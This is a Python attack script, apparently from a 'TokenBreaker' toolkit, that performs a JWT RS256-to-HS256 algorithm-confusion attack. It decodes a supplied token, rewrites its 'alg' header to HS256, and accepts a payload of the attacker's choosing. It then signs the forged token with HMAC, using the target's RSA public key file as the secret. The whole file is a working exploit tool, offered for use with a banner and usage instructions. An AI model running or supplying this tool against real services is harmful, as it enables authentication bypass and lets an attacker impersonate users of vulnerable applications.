#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from stoyled import *
from argparse import ArgumentParser
from base64 import b64encode, b64decode
from re import sub as reSubst
from hmac import new as hmac
from hashlib import sha256
from sys import exit


def banner():
    logo = '\033[1m ___  ___   _     _         _  _ __  __   _   ___\n| _ \\/ '
    logo += '__| /_\\   | |_ ___  | || |  \\/  | /_\\ / __|\n|   /\\__ \\/ _ '
    logo += '\\  |  _/ _ \\ | __ | |\\/| |/ _ \\ (__\n|_|_\\|___/_/ \\_\\  \\_'
    logo += '_\\___/ |_||_|_|  |_/_/ \\_\\___|\n\033[0m'
    print(logo)


def pad_check(data):
    missing_padding = len(data) % 4
    if missing_padding != 0:
        data += '=' * (4 - missing_padding)
    return data


def print_header(token, pubkey):
    header = b64decode(pad_check(token.split('.')[0]))
    payload = b64decode(pad_check(token.split('.')[1]))
    print(info("Decoded Header value -> {}".format(header.decode())))
    print(info("Decode Payload value -> {}".format(payload.decode())))
    header = reSubst(b'"alg":".{5}"', b'"alg":"HS256"', header)
    print(info("New header value with HMAC -> {}".format(header.decode())))
    modify_response = coolInput("Modify Header? [y/N]")
    if modify_response.lower() == 'y':
        header = coolInput("Enter your header with 'alg' -> 'HS256'").encode()
        print(info("Header set to -> {}".format(header.decode())))
    payload = coolInput("Enter Your Payload value")
    base64header = b64encode(header).rstrip(b'=')
    base64payload = b64encode(payload.encode()).rstrip(b'=')
    try:
        pubKey = open(pubkey).read().encode()
    except IOError as ioErr:
        print(bad("IOError -> {}".format(ioErr)))
        exit(1)
    headerNpayload = base64header + b'.' + base64payload
    verifySig = hmac(pubKey, msg=headerNpayload, digestmod=sha256)
    verifySig = b64encode(verifySig.digest())
    verifySig = verifySig.replace(b'/', b'_').replace(b'+', b'-').strip(b'=')
    finaljwt = headerNpayload + b'.' + verifySig

    print(good("Successfully Encoded Token -> {}".format(finaljwt.decode())))


def main():
    usage = 'Example Usage: \npython RsatoHMAC.py -t [JWTtoken] -p [PathtoPubl'
    usage += 'ickeyfile]\n'
    parser = ArgumentParser(description='TokenBreaker: 2.RSAtoHMAC',
                            epilog=usage)
    requiredparser = parser.add_argument_group('required arguments')
    requiredparser.add_argument('-t', '--token', help="JWT Token value",
                                required=True)
    requiredparser.add_argument('-p', '--pubkey',
                                help="Path to Public key File", required=True)
    args = parser.parse_args()
    banner()
    print_header(args.token, args.pubkey)


if __name__ == '__main__':
    main()
